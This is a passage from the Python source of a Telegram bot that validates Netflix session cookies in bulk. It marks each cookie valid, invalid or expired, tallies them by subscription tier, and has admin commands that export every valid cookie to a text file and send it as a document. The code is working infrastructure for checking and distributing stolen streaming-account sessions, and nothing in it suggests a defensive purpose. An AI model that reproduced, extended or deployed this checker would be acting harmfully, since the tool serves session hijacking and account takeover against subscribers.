            await query.edit_message_text(response, parse_mode="Markdown", reply_markup=keyboard)
        else:
            db.update_cookie(cookie_id, {"status": "invalid", "error": result.get("error"), "checked_at": now_utc()})
            db.log_check(user_id, cookie_id, "invalid", result)
            response = format_invalid_response()
            keyboard = invalid_keyboard(cookie_id)
            await query.edit_message_text(response, parse_mode="Markdown", reply_markup=keyboard)
        return

# ----------------------------- ADMIN COMMANDS ---------------------------
@admin_required
async def admin_approve(update, context):
    try:
        uid = int(context.args[0])
        db.create_user(uid)
        if db.approve_user(uid):
            await update.message.reply_text(f"✅ User {uid} approved.")
        else:
            await update.message.reply_text("❌ Failed.")
    except:
        await update.message.reply_text("❌ Usage: /approve <user_id>")

@admin_required
async def admin_users(update, context):
    users = list(db.users.find({}))
    if not users:
        await update.message.reply_text("No users.")
        return
    msg = "👥 *Users*\n\n"
    for u in users[:15]:
        status = "✅" if u.get("approved") else "❌"
        if u.get("is_admin"):
            status = "👑"
        msg += f"{status} `{u['user_id']}` – Checks: {u.get('total_checks',0)}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

@admin_required
async def admin_cookies(update, context):
    stats = db.get_stats()
    msg = (
        f"🍪 *Cookie Statistics*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 *Total:* {stats['total']}\n"
        f"✅ *Valid:* {stats['valid']}\n"
        f"❌ *Invalid:* {stats['invalid']}\n"
        f"⏰ *Expired:* {stats['expired']}\n"
        f"⏳ *Pending:* {stats['pending']}\n\n"
        f"*Tier Breakdown*\n"
        f"⭐ Premium: {stats['tiers']['Premium']}\n"
        f"📺 Standard: {stats['tiers']['Standard']}\n"
        f"📱 Basic: {stats['tiers']['Basic']}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

@admin_required
async def admin_export(update, context):
    cookies = db.get_valid_cookies()
    if not cookies:
        await update.message.reply_text("No valid cookies.")
        return
    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"netflix_valid_{int(time.time())}.txt"
    path = os.path.join(EXPORT_DIR, filename)
    with open(path, 'w', encoding='utf-8') as f:
        f.write("# Netflix Valid Cookies\n")
        f.write(f"# Exported: {now_utc().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write(f"# Total: {len(cookies)}\n\n")
        for c in cookies:
            f.write(c['cookie'])
            f.write("\n\n")
    with open(path, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"✅ {len(cookies)} valid cookies. Multi‑line preserved."
        )
    os.remove(path)

@admin_required
async def admin_cleanup(update, context):
    deleted = db.delete_invalid()
    await update.message.reply_text(f"✅ Deleted {deleted} invalid/expired cookies.")

@admin_required
async def admin_clear(update, context):
    total = db.delete_all()
    await update.message.reply_text(f"⚠️ Deleted {total} cookies.")

# ----------------------------- ERROR HANDLER ----------------------------
async def error_handler(update, context):
    logger.error(f"Update {update} caused {context.error}")
    try:
        await update.message.reply_text("⚠️ Internal error. Try again.")
    except:
        pass

# ----------------------------- MAIN -------------------------------------
def main():
    if not BOT_TOKEN:
        logger.critical("BOT_TOKEN missing.")
        sys.exit(1)
    if not MONGODB_URI:
        logger.critical("MONGODB_URI missing.")
        sys.exit(1)

    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(CommandHandler("cookies", admin_cookies))

    # Bulk conversation – admin only (checked inside)
    bulk_conv = ConversationHandler(
        entry_points=[CommandHandler("bulk", bulk_start)],
        states={
            BULK_STATE: [
                MessageHandler(filters.Document.ALL, handle_bulk_file),
                CommandHandler("done", bulk_done),
                MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u,c: u.message.reply_text("Send a .txt file, /done, or /cancel."))
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_bulk)]
    )
    app.add_handler(bulk_conv)

    # Admin commands
    app.add_handler(CommandHandler("approve", admin_approve))
    app.add_handler(CommandHandler("users", admin_users))
    app.add_handler(CommandHandler("export", admin_export))
    app.add_handler(CommandHandler("cleanup", admin_cleanup))
    app.add_handler(CommandHandler("clear", admin_clear))

    # Message handlers for direct paste / file upload
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_single))
    app.add_handler(MessageHandler(filters.Document.ALL, check_single))

    # Callback handlers – include all patterns
    app.add_handler(CallbackQueryHandler(callback_handler, pattern="^(restart|check_prompt|scan_new|bulk_prompt|recheck_)"))

    app.add_error_handler(error_handler)

    logger.info("Bot started.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()